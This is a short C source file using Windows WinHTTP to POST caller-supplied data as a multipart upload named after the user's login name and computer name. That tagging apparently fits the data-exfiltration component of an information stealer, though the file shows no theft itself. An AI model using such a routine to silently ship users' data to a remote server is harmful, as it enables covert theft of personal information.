#include "connection.h"

HINTERNET InitSession() {
  HINTERNET hSession = WinHttpOpen( L"LCT/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  return hSession;
}


HINTERNET Connect(HINTERNET hSession, char* hostname, int port) {
  int size = MultiByteToWideChar(CP_ACP, 0, hostname, -1, NULL, 0);
  const WCHAR wideHostname[size];
  MultiByteToWideChar(CP_ACP, 0, hostname, -1, (LPWSTR) wideHostname, size);

  HINTERNET hConnect = WinHttpConnect(hSession, wideHostname, port, 0);

  return hConnect;
}

int Upload(HINTERNET hConnect, char* data, char* uname, char* pcname)
{

    int size = MultiByteToWideChar(CP_ACP, 0, PATH, -1, NULL, 0);
    const WCHAR widePath[size];
    MultiByteToWideChar(CP_ACP, 0, PATH, -1, (LPWSTR) widePath, size);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", widePath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if(hRequest == NULL) {
        return -1;
    }

    // Data Construction
    const char* multipartReqFmt = "--de1d904b0eac26da58d66a5de12dcd4d\r\n"
    "Content-Disposition: form-data; name=\"document\"; filename=\"%s@%s.json\"\r\n"
    "\r\n%s\r\n%s";
    char* finalBody = "--de1d904b0eac26da58d66a5de12dcd4d--\r\n";

    size_t multiPartReqBodySize = strlen(uname) + strlen(pcname) + strlen(multipartReqFmt) + strlen(data) + strlen(finalBody) - 7;
    char *multiPartReqBody = malloc(multiPartReqBodySize);

    sprintf_s(multiPartReqBody, multiPartReqBodySize, multipartReqFmt, uname, pcname, data, finalBody);

    // Headers Construction
    const wchar_t *headersFmt =
        L"Content-Type: multipart/form-data; boundary=de1d904b0eac26da58d66a5de12dcd4d\r\n"
        L"Accept-Encoding: gzip, deflate\r\n"
        L"Accept: */*\r\n"
        L"Connection: keep-alive\r\n"
        L"Content-Length: %llu";

    int digitCount = 0;
    for(size_t i = multiPartReqBodySize; i != 0; i/=10)
        digitCount++;

    size_t headersSize = wcslen(headersFmt) + digitCount;
    wchar_t* headers = malloc(headersSize * sizeof* headers);
    if(headers == NULL){
        free(multiPartReqBody);
        return -1;
    }
    swprintf_s(headers, headersSize, headersFmt, multiPartReqBodySize);

    int bResults = WinHttpAddRequestHeaders(
        hRequest,
        headers,
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD
    );
    if(bResults != 1) {
        free(multiPartReqBody);
        free(headers);
        return -1;
    }

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        multiPartReqBodySize,
        0);
    if(bResults != 1) {
        free(multiPartReqBody);
        free(headers);
        return -2;
    }

    DWORD dwBytesWritten = 0;
    bResults = WinHttpWriteData(hRequest, multiPartReqBody,
        multiPartReqBodySize,
        &dwBytesWritten);
    if(bResults != 1) {
        free(multiPartReqBody);
        free(headers);
        return -1;
    }

    if (hRequest) WinHttpCloseHandle(hRequest);

    free(multiPartReqBody);
    free(headers);
    return 0;
}
